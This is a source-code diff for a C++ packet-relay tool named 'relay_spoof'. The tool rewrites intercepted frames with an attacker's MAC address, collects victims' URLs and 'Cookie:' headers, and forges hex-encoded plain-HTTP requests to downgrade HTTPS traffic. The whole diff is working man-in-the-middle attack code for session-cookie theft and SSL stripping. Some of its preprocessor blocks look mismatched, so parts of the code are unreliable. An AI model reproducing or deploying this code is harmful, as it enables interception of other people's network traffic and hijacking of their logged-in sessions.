@@ -16,7 +16,8 @@ relay_spoof::relay_spoof(QObject *parent) : QThread(parent) {
 }
 
 void relay_spoof::run() {
-	int cnt = 0;
+	int chk = 0;
+	unsigned i = 0;
 	bpf_u_int32 netp, maskp;
 	struct bpf_program filter;
 	char errbuf[PCAP_ERRBUF_SIZE];
@@ -38,7 +39,7 @@ void relay_spoof::run() {
 	spoofStop = false;
 
 	while(1) {
-		while((cnt = pcap_next_ex(spoofPcap, &pkthdr, (const u_char**)&packet)) > 0) {
+		while((chk = pcap_next_ex(spoofPcap, &pkthdr, (const u_char**)&packet)) > 0) {
 			eth = (struct libnet_ethernet_hdr *)packet;
 			tcp = (struct libnet_tcp_hdr *)(packet + sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_ipv4_hdr));
 
@@ -52,22 +53,15 @@ void relay_spoof::run() {
 					*(packet + ETHER_ADDR_LEN + i) = *(spoofAtkMac + i);
 				}
 
-				pcap_sendpacket(spoofPcap, packet, pkthdr->len);
 	#if DEBUG_ON
 				printf("\n##### Host to WEB in (%s:%s:%d) #####\n", __FILE__, __func__, __LINE__);
 				print_packet(pkthdr->len, packet);
+				print_headers(packet);
 	#endif
-#endif
 
-				if(ntohs(tcp->th_dport) == 443) {
-#if DEBUG_ON
-					printf("\n##### SSL Packet in (%s:%s:%d) #####\n", __FILE__, __func__, __LINE__);
-					print_packet(pkthdr->len, packet);
-					print_headers(packet);
+				if(ntohs(tcp->th_dport) == 443) getStrip(spoofPcap, packet);
+				else pcap_sendpacket(spoofPcap, packet, pkthdr->len);
 #endif
-					if(ssl_cnt < 3) getStrip(spoofPcap, packet);
-				}
-
 				getUrl(packet, pkthdr->len);
 				if(get_broad_cnt != test_cnt) {
 					emit relay_urlList(relay_url_list);
@@ -85,11 +79,14 @@ void relay_spoof::run() {
 					*(packet + ETHER_ADDR_LEN + i) = *(spoofAtkMac + i);
 				}
 
-				pcap_sendpacket(spoofPcap, packet, pkthdr->len);
 	#if DEBUG_ON
 				printf("\n##### WEB to Host in (%s:%s:%d) #####\n", __FILE__, __func__, __LINE__);
 				print_packet(pkthdr->len, packet);
+				print_headers(packet);
 	#endif
+
+				if(ntohs(tcp->th_dport) == 443) continue;
+				else pcap_sendpacket(spoofPcap, packet, pkthdr->len);
 #endif
 				sendUrl(packet, pkthdr->len);
 			}
@@ -103,7 +100,7 @@ void relay_spoof::run() {
 }
 
 void getUrl(u_char *packet, int len) {
-	int i = 0, tmp = 0, cnt = 0, get_len = len;
+	int i = 0, tmp = 0, flag = 0, get_len = len;
 	bool var = false;
 	u_char *text = packet;
 	QString imsi, tempStr;
@@ -111,7 +108,7 @@ void getUrl(u_char *packet, int len) {
 	get_len -= 54;
 
 	while(get_len > 0) {
-        if(!strncmp((const char*)text, "GET", 3))
+		if(!strncmp((const char*)text, "GET", 3))
 			while(get_len > 0) {
 				if(*(text+i) > 32 && *(text+i) < 127) {
 					tempStr.append(*(text+i));
@@ -130,33 +127,33 @@ void getUrl(u_char *packet, int len) {
 
 	i = 0; tmp = 0;
 	if(!tempStr.isEmpty()) {
-		//        qDebug() << "#####getUrl : " << tempStr;
+		//		qDebug() << "#####getUrl : " << tempStr;
 		while(true) {
-            if(!strncasecmp(tempStr.toLocal8Bit().data() + i, "Host:", 5)) {
+			if(!strncasecmp(tempStr.toLocal8Bit().data() + i, "Host:", 5)) {
 				i += 6;
 				imsi.append("http://");
 
 				while(true) {
-                    if(!strncmp(tempStr.toLocal8Bit().data() + i, "..", 2) || tempStr.length() == i) break;
+					if(!strncmp(tempStr.toLocal8Bit().data() + i, "..", 2) || tempStr.length() == i) break;
 					imsi.append(tempStr.at(i++));
 				}
 
 				i -= (tmp + imsi.length() - 1);
 				while(true) {
-                    if(!strncasecmp(tempStr.toLocal8Bit().data() + i, "GET", 3) && tempStr.at(i+5) != ' ') {
+					if(!strncasecmp(tempStr.toLocal8Bit().data() + i, "GET", 3) && tempStr.at(i+5) != ' ') {
 						i += 4;
 						while(true) {
 							imsi.append(tempStr.at(i++));
-                            if(!strncmp(tempStr.toLocal8Bit().data() + i, "/ ", 2)) break;
-                            else if(!strncasecmp(tempStr.toLocal8Bit().data() + i + 1, "HTTP/", 5) || tempStr.length() == i) break;
+							if(!strncmp(tempStr.toLocal8Bit().data() + i, "/ ", 2)) break;
+							else if(!strncasecmp(tempStr.toLocal8Bit().data() + i + 1, "HTTP/", 5) || tempStr.length() == i) break;
 						}
 					}
 					else if(tempStr.length() == (++i)) break;
 				}
 
-				if(!relay_url_list.isEmpty()) for(tmp = 0; tmp < relay_url_list.length(); tmp++) if(relay_url_list.at(tmp) == imsi) cnt = 100;
+				if(!relay_url_list.isEmpty()) for(tmp = 0; tmp < relay_url_list.length(); tmp++) if(relay_url_list.at(tmp) == imsi) flag = 100;
 
-				if(cnt != 100) {
+				if(flag != 100) {
 					get_broad_cnt++;
 					imsi.detach();
 					relay_url_list.append(imsi);
@@ -169,10 +166,10 @@ void getUrl(u_char *packet, int len) {
 		i = 0; imsi.clear();
 		if(tempStr.contains("Cookie: ")) {
 			while(true) {
-                if(!strncasecmp(tempStr.toLocal8Bit().data() + i, "Cookie: ", 8)) {
+				if(!strncasecmp(tempStr.toLocal8Bit().data() + i, "Cookie: ", 8)) {
 					while(true) {
 						imsi.append(tempStr.at(i++));
-                        if(!strncmp(tempStr.toLocal8Bit().data() + i, "....", 4)) break;
+						if(!strncmp(tempStr.toLocal8Bit().data() + i, "....", 4)) break;
 					}
 					relay_data_list.append(imsi);
 					break;
@@ -191,46 +188,54 @@ void sendUrl(u_char *packet, int len) {
 	u_char *text = packet;
 
 	for(int i = 0; i < (len - 1); i++) tempStr.append(*(text+i));
-	//    qDebug() << "sendUrl : " << tempStr;
+	qDebug() << "sendUrl : " << tempStr;
 }
 
 void getStrip(pcap_t *spoofPcap, u_char *packet) {
-	char str[INET_ADDRSTRLEN] = {0,};
-	struct libnet_ipv4_hdr *ip;
-	unsigned startHttp = sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_ipv4_hdr) + sizeof(struct libnet_tcp_hdr);
+//	char str[INET_ADDRSTRLEN] = {0,};
+//	struct libnet_ipv4_hdr *ip;
+	unsigned startHttp = sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_ipv4_hdr) + sizeof(struct libnet_tcp_hdr), i = 0;
 
-	const char * host1 = "\x47\x45\x54\x20\x2f\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x20\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x37\x2e\x30\x3b\x20\x72\x76\x3a\x31\x31\x2e\x30\x29\x20\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x0d\x0a\x41\x63\x63\x65\x70\x74\x3a\x20\x2a\x2f\x2a\x0d\x0a\x41\x63\x63\x65\x70\x74\x2d\x45\x6e\x63\x6f\x64\x69\x6e\x67\x3a\x20\x69\x64\x65\x6e\x74\x69\x74\x79\x0d\x0a\x48\x6f\x73\x74\x3a\x20";
-	const char * host2 = "\x0d\x0a\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x3a\x20\x4b\x65\x65\x70\x2d\x41\x6c\x69\x76\x65\x0d\x0a\x0d\x0a";
-	u_char *fakePacket = (u_char*)malloc(sizeof(u_char) * (sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_ipv4_hdr) + sizeof(struct libnet_tcp_hdr) + strlen(host1) + strlen(host2) + IP_ADDR_LEN));
-
-	for(int i = 0; i < startHttp; i++)
-		*(fakePacket + i) = *(packet + i);
 #if 0
 "GET / HTTP/1.1 \
 User-Agent : Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko \
 Accept: */* \
 Accept-Encoding: identity \
-Host: %s \
-Connection: Keep-Alive \
-";
+Host:" 
 #endif
-	ip = (struct libnet_ipv4_hdr *)(fakePacket + sizeof(struct libnet_ethernet_hdr));
+	const char *host1 = "\x47\x45\x54\x20\x2f\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x20\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x37\x2e\x30\x3b\x20\x72\x76\x3a\x31\x31\x2e\x30\x29\x20\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x0d\x0a\x41\x63\x63\x65\x70\x74\x3a\x20\x2a\x2f\x2a\x0d\x0a\x41\x63\x63\x65\x70\x74\x2d\x45\x6e\x63\x6f\x64\x69\x6e\x67\x3a\x20\x69\x64\x65\x6e\x74\x69\x74\x79\x0d\x0a\x48\x6f\x73\x74\x3a\x20";
+
+#if 0
+" \
+Connection: Keep-Alive \
+"
+#endif
+	const char *host2 = "\x0d\x0a\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x3a\x20\x4b\x65\x65\x70\x2d\x41\x6c\x69\x76\x65\x0d\x0a\x0d\x0a";
+
+	// host1 + %s(ip) + host2
+	u_char *fakePacket = (u_char*)malloc(sizeof(u_char) * (sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_ipv4_hdr) + sizeof(struct libnet_tcp_hdr) + strlen(host1) + strlen(host2) + IP_ADDR_LEN));
+
+	for(i = 0; i < startHttp; i++)
+		*(fakePacket + i) = *(packet + i);
+
+//	ip = (struct libnet_ipv4_hdr *)(fakePacket + sizeof(struct libnet_ethernet_hdr));
 	unsigned ipLocate = sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_ipv4_hdr);
 	unsigned pktLen = startHttp + strlen(host1) + IP_ADDR_LEN + strlen(host2);
 	*(fakePacket + ipLocate + sizeof(uint16_t)) = 0x00;
 	*(fakePacket + ipLocate + sizeof(uint16_t) + sizeof(char)) = 0x50;
 
-	for(int i = 0; i < strlen(host1); i++)
+	for(i = 0; i < strlen(host1); i++)
 		*(fakePacket + i + startHttp) = *(host1 + i);
 	
-	for(int i = 0; i < IP_ADDR_LEN; i++)
+	for(i = 0; i < IP_ADDR_LEN; i++)
 		*(fakePacket + i + startHttp + strlen(host1)) = *(packet + ipLocate - IP_ADDR_LEN + i);
 	
-	for(int i = 0; i < strlen(host2); i++)
+	for(i = 0; i < strlen(host2); i++)
 		*(fakePacket + i + startHttp + strlen(host1) + IP_ADDR_LEN) = *(host2 + i);
 
 	pcap_sendpacket(spoofPcap, fakePacket, pktLen);
 #if DEBUG_ON
+	printf("\n##### Falsify Packet in (%s:%s:%d) #####\n", __FILE__, __func__, __LINE__);
 	print_packet(pktLen, fakePacket);
 	print_headers(fakePacket);
 #endif
